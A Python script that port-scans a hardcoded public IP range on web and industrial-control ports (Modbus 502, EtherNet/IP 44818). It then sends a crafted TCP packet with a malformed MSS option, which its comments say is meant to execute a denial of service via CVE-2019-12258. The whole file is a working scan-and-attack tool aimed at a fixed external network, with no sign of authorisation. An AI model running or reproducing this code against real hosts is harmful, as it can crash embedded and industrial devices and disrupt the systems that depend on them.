from scapy.all import *
from netaddr import *

import socket
import sys
import argparse
import netifaces
import os
import socket
import time
import ipaddress

BUF_SIZE = 1024
TCP_RST_FLAG = 4

VERBOSE_NONE = 0
VERBOSE_NORMAL = 1
VERBOSE_HIGH = 2



ERR_ASSET_VULNERABLE = 1
ERR_CON_REFUSED = 2
ERR_CON_TIMED_OUT = 3

ip_range = '45.42.173.144/28'
ports = [80, 443, 502, 44818]
TIMEOUT = 3


def scan_ip_port(ip, port):
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(TIMEOUT)
			result = s.connect_ex((str(ip), port))
			if result == 0:
				try:
					s.sendall(b'\r\n')
					banner = s.recv(1024).decode(errors='ignore')
				except Exception as e:
					banner = f"No banner received or error: {str(e)}"
				return (True, banner.strip())
			else:
				return (False, "Connection refused or timed out")
	except Exception as e:
		return (False, f"Error: {str(e)}")



#  converting windows GUID to interface name
def convert_windows_guid_to_interface(guid):
	for interface in get_windows_if_list():
		if interface['guid'] == guid:
			return interface['name']
	return None


# get interface name for the given socket
def get_iface(sock):
	source_ip = sock.getsockname()[0]
	for inter in netifaces.interfaces():
		inet = netifaces.ifaddresses(inter).get(netifaces.AF_INET, [])
		if any(a['addr'] == source_ip for a in inet):
			if os.name == 'nt':  # inter is a guid- we need to convert it to an actual name
				return convert_windows_guid_to_interface(inter)
			return inter
	return None


class CveTester(object):
	def __init__(self, ip, port, verbose=VERBOSE_NORMAL, ip_end=None):
		self.verbose = verbose
		self.ip = ip
		self.tcp_port = port
		self.ip_end = ip_end

	# initiate a TCP socket
	def open_socket(self, dst_ip, dst_port):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(3)
		try:
			s.connect((str(dst_ip), dst_port))
		except socket.timeout:
			if self.verbose > VERBOSE_NORMAL:
				print('Log: Unable to establish a connection to host {} port {}'.format(dst_ip, dst_port))
			return ERR_CON_TIMED_OUT
		except ConnectionRefusedError:
			if self.verbose >= VERBOSE_NORMAL:
				print("Log: The host {} has actively refused a connection to port {}".format(dst_ip, dst_port))
			return ERR_CON_REFUSED
		return s

	# try to execute DoS using CVE-12258
	def try_dos(self, sock, interface):
		src_ip, src_port = sock.getsockname()
		dst_ip, dst_port = sock.getpeername()
		tcp_pkt = (Ether() / IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port))
		tcp_pkt['TCP'].options = [('MSS', '\x00')]
		if self.verbose == VERBOSE_HIGH:
			return srp(tcp_pkt, iface=interface, timeout=2)
		return srp(tcp_pkt, iface=interface, timeout=2, verbose=0)

	def is_ip_vulnerable(self, ip, tcp_port, interface=None):
		s = self.open_socket(ip, tcp_port)
		if s in [ERR_CON_REFUSED, ERR_CON_TIMED_OUT]:
			return s

		if not interface:
			interface = get_iface(s)
			if not interface:  # failed to get an interface
				print('Error: Failed to get the correct interface for the host {}'.format(ip))
				return False

		out = self.try_dos(s, interface)
		try:
			answers = out[0]  # get the answers
			res = answers[0]  # results list from the answers
			res_packet = res[1]  # the packet we want to check
			tcp = res_packet[TCP]  # tcp layer
			if tcp.flags & TCP_RST_FLAG == TCP_RST_FLAG:  # check whether TCP RST flag is on
				return True
		except (IndexError, TypeError):  # returned packet is not what we expected
			pass
		s.close()
		return False

	def is_ip_vulnerable_wrapper(self, ip, interface):
		asset_found = False
		retval = self.is_ip_vulnerable(ip, self.tcp_port, interface)
		if retval == ERR_ASSET_VULNERABLE:
			print('The host {} is vulnerable to  CVE-2019-12258'.format(ip))
			return
		elif retval != ERR_CON_TIMED_OUT:
			asset_found = True
		if self.verbose > VERBOSE_NONE and asset_found:
			print('The host {} is not vulnerable to  CVE-2019-12258'.format(ip))
		elif self.verbose > VERBOSE_NONE:
			print('Could not establish a connection to the host {}'.format(ip))

	def test_for_cve(self, interface):
		self.is_ip_vulnerable_wrapper(self.ip, interface)




if __name__ == "__main__":
	network = ipaddress.ip_network(ip_range, strict=False)
	for ip in network.hosts():
		print(f"\nScanning IP: {ip}")
		for port in ports:
			open_status, response = scan_ip_port(ip, port)
			verbose = 2
			interface = "ens33"
			print(f"  Port {port}: {'Open' if open_status else 'Closed'}\n    Response: {response}")
			if open_status:
				if port == 80:
					cve_tester = CveTester(ip, port, verbose=verbose)
					cve_tester.test_for_cve(interface)
				elif port == 443:
					cve_tester = CveTester(ip, port, verbose=verbose)
					cve_tester.test_for_cve(interface)
				elif port == 44818:
					cve_tester = CveTester(ip, port, verbose=verbose)
					cve_tester.test_for_cve(interface)
				elif port == 502:
					cve_tester = CveTester(ip, port, verbose=verbose)
					cve_tester.test_for_cve(interface)                                       
